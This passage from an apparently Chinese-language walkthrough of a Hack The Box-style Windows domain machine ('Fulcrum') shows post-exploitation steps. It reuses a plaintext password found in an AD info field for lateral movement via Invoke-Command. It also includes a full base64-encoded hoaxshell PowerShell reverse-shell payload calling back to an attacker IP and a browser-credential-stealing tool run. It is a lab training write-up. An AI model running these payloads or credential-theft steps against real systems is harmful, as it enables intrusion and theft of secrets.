&#123;CN=Computer,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>iscriticalsystemobject         &#123;False&#125;<br>operatingsystem                &#123;Windows Server <span class="hljs-number">2019</span> Standard&#125;<br>usnchanged                     &#123;<span class="hljs-number">24602</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>name                           &#123;FILE&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">133066646717324030</span>&#125;<br>serviceprincipalname           &#123;WSMAN/FILE, WSMAN/FILE.fulcrum.local, RestrictedKrbHost/FILE, HOST/FILE...&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user...&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306369</span>&#125;<br>lastlogontimestamp             &#123;<span class="hljs-number">133066638251998389</span>&#125;<br>usncreated                     &#123;<span class="hljs-number">12854</span>&#125;<br>objectguid                     &#123;<span class="hljs-number">85</span> <span class="hljs-number">210</span> <span class="hljs-number">141</span> <span class="hljs-number">244</span> <span class="hljs-number">110</span> <span class="hljs-number">221</span> <span class="hljs-number">154</span> <span class="hljs-number">74</span> <span class="hljs-number">177</span> <span class="hljs-number">149</span> <span class="hljs-number">208</span> <span class="hljs-number">194</span> <span class="hljs-number">121</span> <span class="hljs-number">84</span> <span class="hljs-number">186</span> <span class="hljs-number">112</span>&#125;<br>localpolicyflags               &#123;<span class="hljs-number">0</span>&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">49</span>:<span class="hljs-number">11</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=FILE,CN=Computers,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">4096</span>&#125;<br>cn                             &#123;FILE&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>primarygroupid                 &#123;<span class="hljs-number">515</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">9</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">44</span>:<span class="hljs-number">31</span> AM&#125;<br>operatingsystemversion         &#123;<span class="hljs-number">10.0</span> (<span class="hljs-number">17763</span>)&#125;<br>dnshostname                    &#123;FILE.fulcrum.local&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM&#125;<br>lastlogon                      &#123;<span class="hljs-number">133066746614970918</span>&#125;<br>distinguishedname              &#123;CN=FILE,CN=Computers,DC=fulcrum,DC=local&#125;<br>msds<span class="hljs-literal">-supportedencryptiontypes</span>  &#123;<span class="hljs-number">28</span>&#125;<br>samaccountname                 &#123;FILE<span class="hljs-variable">$</span>&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">82</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">9223372036854775807</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell">name                           &#123;BTables&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">132964669694854344</span>&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>lastlogontimestamp             &#123;<span class="hljs-number">132965813265089947</span>&#125;<br>streetaddress                  &#123;unknown&#125;<br>usncreated                     &#123;<span class="hljs-number">12628</span>&#125;<br>sn                             &#123;BTables&#125;<br>company                        &#123;fulcrum&#125;<br>objectguid                     &#123;<span class="hljs-number">211</span> <span class="hljs-number">177</span> <span class="hljs-number">93</span> <span class="hljs-number">142</span> <span class="hljs-number">140</span> <span class="hljs-number">210</span> <span class="hljs-number">161</span> <span class="hljs-number">74</span> <span class="hljs-number">180</span> <span class="hljs-number">157</span> <span class="hljs-number">245</span> <span class="hljs-number">248</span> <span class="hljs-number">33</span> <span class="hljs-number">105</span> <span class="hljs-number">89</span> <span class="hljs-number">254</span>&#125;<br>info                           &#123;Password <span class="hljs-built_in">set</span> to ++FileServerLogon12345++&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">02</span>:<span class="hljs-number">49</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=BTables,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">66048</span>&#125;<br></code></pre></td></tr></table></figure><p>我拿到了一组凭证，BTables用户的info中有一条密码：++FileServerLogon12345++。而它对应的应该是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">serviceprincipalname           &#123;WSMAN/FILE, WSMAN/FILE.fulcrum.local, RestrictedKrbHost/FILE, HOST/FILE...&#125;<br></code></pre></td></tr></table></figure><p>应该是被防火墙拦截被禁止探测FILE，FILE在这里：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-variable">$btpass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;++FileServerLogon12345++&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-variable">$btcred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;FULCRUM\btables&#x27;</span>, <span class="hljs-variable">$btpass</span>)<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> file.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$btcred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125;<br>fulcrum\btables<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> file.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$btcred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; ipconfig &#125;<br><br>Windows IP Configuration<br><br><br>Ethernet adapter Ethernet:<br><br>   Connection<span class="hljs-literal">-specific</span> DNS Suffix  . :<br>   Link<span class="hljs-literal">-local</span> IPv6 Address . . . . . : fe80::<span class="hljs-number">7951</span>:<span class="hljs-number">5</span>c86:<span class="hljs-number">6630</span>:<span class="hljs-number">5</span>e64%<span class="hljs-number">3</span><br>   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.132</span><br>   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>   Default Gateway . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> file.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$btcred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; ipconfig /all &#125;<br><br>Windows IP Configuration<br><br>   Host Name . . . . . . . . . . . . : FILE<br>   Primary Dns Suffix  . . . . . . . : fulcrum.local<br>   Node <span class="hljs-built_in">Type</span> . . . . . . . . . . . . : Hybrid<br>   IP Routing Enabled. . . . . . . . : No<br>   WINS Proxy Enabled. . . . . . . . : No<br>   DNS Suffix Search List. . . . . . : fulcrum.local<br><br>Ethernet adapter Ethernet:<br><br>   Connection<span class="hljs-literal">-specific</span> DNS Suffix  . :<br>   Description . . . . . . . . . . . : Intel(<span class="hljs-built_in">R</span>) PRO/<span class="hljs-number">1000</span> MT Network Connection<br>   Physical Address. . . . . . . . . : <span class="hljs-number">52</span><span class="hljs-literal">-54-00-9E-52-F3</span><br>   DHCP Enabled. . . . . . . . . . . : Yes<br>   Autoconfiguration Enabled . . . . : Yes<br>   Link<span class="hljs-literal">-local</span> IPv6 Address . . . . . : fe80::<span class="hljs-number">7951</span>:<span class="hljs-number">5</span>c86:<span class="hljs-number">6630</span>:<span class="hljs-number">5</span>e64%<span class="hljs-number">3</span>(Preferred)<br>   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.132</span>(Preferred)<br>   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>   Lease Obtained. . . . . . . . . . : Saturday, September <span class="hljs-number">3</span>, <span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">29</span>:<span class="hljs-number">10</span> AM<br>   Lease Expires . . . . . . . . . . : Saturday, September <span class="hljs-number">3</span>, <span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">43</span>:<span class="hljs-number">37</span> AM<br>   Default Gateway . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span><br>   DHCP Server . . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span><br>   DHCPv6 IAID . . . . . . . . . . . : <span class="hljs-number">106058752</span><br>   DHCPv6 Client DUID. . . . . . . . : <span class="hljs-number">00</span><span class="hljs-literal">-01-00-01-2A-09-35-75-52-54-00-9E-52-F3</span><br>   DNS Servers . . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">122.130</span><br>                                       <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><br>   NetBIOS over Tcpip. . . . . . . . : Enabled<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <br></code></pre></td></tr></table></figure><p>我可以测试一下它能不能访问我已经拿下的linux主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@fulcrum:~<span class="hljs-comment"># tcpdump -I virbr0 -w test.pcap</span><br>tcpdump: virbr0: That device doesn<span class="hljs-string">&#x27;t support monitor mode</span><br><span class="hljs-string">root@fulcrum:~# tcpdump -i virbr0 -w test.pcap</span><br><span class="hljs-string">tcpdump: listening on virbr0, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> file.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$btcred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; ping <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span> &#125;<br><br>Pinging <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span> with <span class="hljs-number">32</span> bytes of <span class="hljs-keyword">data</span>:<br>Reply from <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span>: bytes=<span class="hljs-number">32</span> time&lt;<span class="hljs-number">1</span>ms TTL=<span class="hljs-number">64</span><br>Reply from <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">2</span>ms TTL=<span class="hljs-number">64</span><br>Reply from <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span>: bytes=<span class="hljs-number">32</span> time&lt;<span class="hljs-number">1</span>ms TTL=<span class="hljs-number">64</span><br>Reply from <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span>: bytes=<span class="hljs-number">32</span> time&lt;<span class="hljs-number">1</span>ms TTL=<span class="hljs-number">64</span><br><br>Ping statistics <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span>:<br>    Packets: Sent = <span class="hljs-number">4</span>, Received = <span class="hljs-number">4</span>, Lost = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),<br>Approximate round trip times <span class="hljs-keyword">in</span> milli<span class="hljs-literal">-seconds</span>:<br>    Minimum = <span class="hljs-number">0</span>ms, Maximum = <span class="hljs-number">2</span>ms, Average = <span class="hljs-number">0</span>ms<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <br></code></pre></td></tr></table></figure><p>那能出网么？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\inetpub\wwwroot&gt; Invoke-Command -ComputerName file.fulcrum.local -Credential <span class="hljs-variable">$btcred</span> -ScriptBlock &#123; ping 10.10.16.3 &#125;<br><br>Pinging 10.10.16.3 with 32 bytes of data:<br>Reply from 10.10.16.3: bytes=32 time=259ms TTL=62<br>Reply from 10.10.16.3: bytes=32 time=562ms TTL=62<br>Reply from 10.10.16.3: bytes=32 time=140ms TTL=62<br>Reply from 10.10.16.3: bytes=32 time=297ms TTL=62<br><br>Ping statistics <span class="hljs-keyword">for</span> 10.10.16.3:<br>    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),<br>Approximate round trip <span class="hljs-built_in">times</span> <span class="hljs-keyword">in</span> milli-seconds:<br>    Minimum = 140ms, Maximum = 562ms, Average = 314ms<br>*Evil-WinRM* PS C:\inetpub\wwwroot&gt; <br></code></pre></td></tr></table></figure><p>可以。很好，那我可以直接反弹一个powershell 的shell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> file.fulcrum.local <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$btcred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; powershell <span class="hljs-literal">-e</span> JABzAD0AJwAxADAALgAxADAALgAxADYALgAzADoAOAAwADgAMAAnADsAJABpAD0AJwA4ADEAMwA2AGUAMQBhAGQALQAxAGIAOAA5AGIAMwBjAGIALQA3ADYAMwBmAGMAZAA5AGUAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AOAAxADMANgBlADEAYQBkACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADAAYwA1ADIALQA3AGUANgBlACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADEAYgA4ADkAYgAzAGMAYgAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAwAGMANQAyAC0ANwBlADYAZQAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwA3ADYAMwBmAGMAZAA5AGUAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAwAGMANQAyAC0ANwBlADYAZQAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A &#125;<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell">CrazyInSide:~/Toolbox/hoaxshell<span class="hljs-variable">$</span> python3 hoaxshell.py <span class="hljs-literal">-s</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">16.3</span><br><br>    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬  <br>    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │  <br>    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘<br>                           by t3l3machus<br><br>[<span class="hljs-type">Info</span>] Generating reverse shell payload...<br>powershell <span class="hljs-literal">-e</span> JABzAD0AJwAxADAALgAxADAALgAxADYALgAzADoAOAAwADgAMAAnADsAJABpAD0AJwA4ADEAMwA2AGUAMQBhAGQALQAxAGIAOAA5AGIAMwBjAGIALQA3ADYAMwBmAGMAZAA5AGUAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AOAAxADMANgBlADEAYQBkACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADAAYwA1ADIALQA3AGUANgBlACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADEAYgA4ADkAYgAzAGMAYgAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAwAGMANQAyAC0ANwBlADYAZQAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwA3ADYAMwBmAGMAZAA5AGUAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAwAGMANQAyAC0ANwBlADYAZQAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A<br>[<span class="hljs-type">Info</span>] <span class="hljs-built_in">Type</span> <span class="hljs-string">&quot;help&quot;</span> to get a list of the available prompt commands.<br>[<span class="hljs-type">Info</span>] Http Server started on port <span class="hljs-number">8080</span>.<br>[<span class="hljs-type">Important</span>] Awaiting payload execution to initiate shell session...<br>[<span class="hljs-type">Shell</span>] Payload execution verified!<br>[<span class="hljs-type">Shell</span>] Stabilizing command prompt...<br><br><span class="hljs-built_in">PS</span> C:\Users\BTables\Documents&gt; whoami<br>fulcrum\btables<br><br><span class="hljs-built_in">PS</span> C:\Users\BTables\Documents&gt; <br></code></pre></td></tr></table></figure><p>终于见到了user.txt：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\BTables&gt; <span class="hljs-built_in">cd</span> Desktop<br><br><br><span class="hljs-built_in">PS</span> C:\Users\BTables\Desktop&gt; <span class="hljs-built_in">ls</span><br>Directory: C:\Users\BTables\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                             <br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                             <br><span class="hljs-literal">-a----</span>         <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span>:<span class="hljs-number">48</span> AM             <span class="hljs-number">32</span> user.txt                                         <br><br><span class="hljs-built_in">PS</span> C:\Users\BTables\Desktop&gt; <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">fc</span>......................................<br></code></pre></td></tr></table></figure><p>用户权限没有什么特殊的，先开始搜集密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Users\BTables\Downloads&gt; copy \\10.10.16.3\share\hack-browser-data-windows-64bit.exe .<br><br><br>PS C:\Users\BTables\Downloads&gt; <span class="hljs-built_in">ls</span><br>Directory: C:\Users\BTables\Downloads<br><br><br>Mode                LastWriteTime         Length Name                                             <br>----                -------------         ------ ----                                             <br>-a----         9/2/2022   8:58 PM        8162816 hack-browser-data-windows-64bit.exe              <br><br>PS C:\Users\BTables\Downloads&gt; .\hack-browser-data-windows-64bit.exe -b all -f json --<span class="hljs-built_in">dir</span> results -zip<br></code></pre></td></tr></table></figure><p>什么都没有：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Chrome Beta failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser OperaGX failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Vivaldi failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser CocCoc failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser QQ failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Chrome failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Microsoft Edge failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Chromium failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Opera failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Brave failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser Yandex failed, profile folder does not exist  <br>[<span class="hljs-type">NOTICE</span>] [<span class="hljs-type">browser.go</span>:<span class="hljs-number">47</span>,<span class="hljs-type">pickChromium</span>] find browser 